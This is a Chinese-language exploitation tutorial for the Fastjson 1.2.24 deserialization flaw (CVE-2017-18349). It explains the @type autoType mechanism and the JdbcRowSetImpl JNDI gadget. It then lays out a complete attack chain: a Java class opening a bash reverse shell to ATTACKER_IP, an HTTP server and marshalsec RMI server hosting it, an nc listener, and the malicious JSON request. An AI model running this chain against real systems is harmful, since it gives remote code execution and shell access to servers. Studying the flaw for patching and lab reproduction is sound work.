# Fastjson <= 1.2.24 反序列化漏洞 (CVE-2017-18349)

## 概述 (Overview)

Fastjson 是阿里巴巴开发的一款高性能 Java JSON 解析库。在 1.2.24 及之前版本中，存在一个严重的反序列化漏洞。Fastjson 提供的 `autoType` 功能（通过 `@type` 字段指定反序列化类）在默认配置下并未有效限制可实例化的类，攻击者可以利用此特性，结合服务器 Classpath 中存在的 "gadget chain"（利用链），实现远程代码执行 (RCE)。 (通常使用 `vulhub` 等靶场环境进行复现)。

## 漏洞原理 (Vulnerability Principle)

1.  **`@type` 自动类型**: Fastjson 允许在 JSON 数据中通过 `@type` 字段显式指定要实例化的 Java 类名。
2.  **Gadget Chain**: 攻击者寻找目标服务器 Classpath 中存在的特定类（Gadget）。这些类在其实例化或其 setter/getter 方法被调用（Fastjson 反序列化时会自动调用）的过程中，会执行某些危险操作，例如 JNDI (Java Naming and Directory Interface) 查询。
3.  **JNDI 注入**: 常用的利用链之一是 `com.sun.rowset.JdbcRowSetImpl`。该类的 `dataSourceName` 属性接收一个 JNDI URL。当 Fastjson 调用其 `setDataSourceName` 方法，或者后续代码触发 JNDI 查询时，会连接到攻击者指定的 JNDI 服务（如 RMI 或 LDAP）。
4.  **恶意类加载**: 攻击者可以搭建恶意的 RMI 或 LDAP 服务器。当受害者服务器连接到该 JNDI 服务时，攻击者的服务器可以返回一个引用，指向一个包含恶意代码的远程 Class 文件（通常托管在 HTTP 服务器上）。受害者服务器会下载并加载这个远程 Class 文件，执行其中的代码，从而实现 RCE。

## 利用步骤 (Exploitation Steps - RMI/JNDI Example)

1.  **编写并编译恶意类**:
    *   创建一个 Java 文件 (e.g., `Exploit.java`)，包含要执行的恶意代码（例如反弹 shell）。
    ```java
    import java.lang.Runtime;
    import java.lang.Process;

    public class Exploit {
        static {
            try {
                // Example: Create a file on the target
                // Runtime.getRuntime().exec("touch /tmp/pwned");

                // Example: Reverse Shell (requires target system with bash/netcat)
                String ip = "ATTACKER_IP"; // Replace with attacker's IP
                String port = "ATTACKER_PORT"; // Replace with attacker's listening port
                String cmd = "/bin/bash -c \"bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1\"";
                Runtime.getRuntime().exec(cmd);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    ```
    *   编译它：`javac Exploit.java`

2.  **启动 HTTP 服务器**:
    *   在包含 `Exploit.class` 文件的目录下启动一个简单的 HTTP 服务器，以便目标服务器可以下载它。
    *   `python3 -m http.server 8000` (或其他端口)

3.  **启动恶意 JNDI (RMI) 服务器**:
    *   使用 `marshalsec` 或类似的工具启动一个 RMI 服务器，该服务器会将 JNDI 查询重定向到步骤 2 中的 HTTP 服务器上的恶意类。
    *   `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://ATTACKER_IP:8000/#Exploit" 9999`
        *   `ATTACKER_IP:8000` 是步骤 2 中 HTTP 服务器的地址和端口。
        *   `#Exploit` 是要加载的类名。
        *   `9999` 是 RMI 服务器监听的端口。

4.  **设置监听器**:
    *   如果恶意代码是反弹 shell，在攻击者机器上启动监听器。
    *   `nc -lvp ATTACKER_PORT`

5.  **发送恶意 JSON Payload**:
    *   使用 `curl` 或 Burp Suite 向目标应用的 Fastjson 解析接口发送包含恶意 JNDI URL 的 JSON payload。
    ```http
    POST /vulnerable-endpoint HTTP/1.1
    Host: TARGET_IP:TARGET_PORT
    Content-Type: application/json
    Content-Length: <calculated_length>

    {
        "a": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "rmi://ATTACKER_IP:9999/Exploit",
            "autoCommit": true
        }
    }
    ```
    *   `ATTACKER_IP:9999` 是步骤 3 中 RMI 服务器的地址和端口。

6.  **触发执行**:
    *   当目标服务器上的 Fastjson 解析此 JSON 时，会实例化 `JdbcRowSetImpl`，设置 `dataSourceName`，并可能在后续操作中触发 JNDI 查询。
    *   服务器连接到攻击者的 RMI 服务器，被重定向到 HTTP 服务器下载 `Exploit.class`，加载并执行其静态代码块中的恶意代码（反弹 shell 或其他命令）。攻击者的监听器收到连接。